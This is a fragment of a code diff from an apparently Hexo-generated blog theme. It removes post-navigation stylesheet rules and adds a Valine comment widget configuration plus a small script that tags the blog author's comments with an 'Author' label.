+                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
+                    meta: ['nick', 'mail', 'link'],
+                    avatar: 'wavatar',
+                    enableQQ: true,
+                    placeholder: '😜若有问题请各位大师傅留言评论',
+                    lang: 'zh-CN'.toLowerCase()
+                });
 
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
+                function getAuthor(language) {
+                    switch (language) {
+                        case 'en':
+                            return 'Author';
+                        case 'zh-CN':
+                            return '博主';
+                        default:
+                            return 'Master';
+                    }
+                }
 
-      keep-container(true, 1.03, 1.03, 10px, 0);
+                // Add "Author" identify
+                const getValineDomTimer = setInterval(() => {
+                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
+                    if (vcards.length > 0) {
+                        let author = '196082';
 
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
+                        if (author) {
+                            for (let vcard of vcards) {
+                                const vnick_dom = vcard.querySelector('.vhead .vnick');
+                                const vnick = vnick_dom.innerHTML;
+                                if (vnick === author) {
+                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
+                                }
+                            }
+                        }
+                        clearInterval(getValineDomTimer);
+                    } else {
+                        clearInterval(getValineDomTimer);
+                    }
+                }, 2000);
+            }
 
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
+            if ('false') {
+                const loadValineTimeout = setTimeout(() => {
+                    loadValine();
+                    clearTimeout(loadValineTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadValine);
+            }
+        </script>
+    </div>
 
 
-}
 
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+</div>
 
 
                 
